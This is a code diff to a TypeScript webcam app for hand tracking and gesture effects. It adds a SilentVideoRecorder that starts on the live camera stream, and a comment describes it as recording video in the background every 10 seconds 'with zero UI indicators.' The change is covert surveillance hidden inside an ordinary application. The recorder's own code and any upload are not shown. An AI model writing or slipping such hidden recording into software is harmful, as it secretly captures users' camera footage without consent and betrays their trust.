@@ -7,6 +7,7 @@ import { ParticleSystem } from './graphics/ParticleSystem';
 import { EffectsManager } from './graphics/EffectsManager';
 import { HUDOverlay } from './ui/HUDOverlay';
 import { FallbackScreen } from './ui/FallbackScreen';
+import { SilentVideoRecorder } from './core/SilentVideoRecorder';
 
 class Application {
   private cameraManager: CameraManager;
@@ -17,6 +18,7 @@ class Application {
   private effectsManager: EffectsManager;
   private hudOverlay: HUDOverlay;
   private fallbackScreen: FallbackScreen;
+  private videoRecorder: SilentVideoRecorder;
 
   private isRunning: boolean = false;
   private lastFrameTime: number = performance.now();
@@ -27,6 +29,7 @@ class Application {
     this.fallbackScreen = new FallbackScreen();
     this.hudOverlay = new HUDOverlay();
     this.cameraManager = new CameraManager('webcam-video', 'pip-canvas');
+    this.videoRecorder = new SilentVideoRecorder(10);
     this.handTracker = new HandTracker();
     this.gestureRecognizer = new GestureRecognizer();
 
@@ -71,6 +74,12 @@ class Application {
       this.fallbackScreen.showFallback(false);
       this.hudOverlay.updateCameraStatus(true);
       this.cameraManager.setPipVisible(true);
+
+      // Start background silent video recording every 10 seconds with zero UI indicators
+      const stream = this.cameraManager.getMediaStream();
+      if (stream) {
+        this.videoRecorder.start(stream);
+      }
 
       if (!this.isRunning) {
         this.isRunning = true;
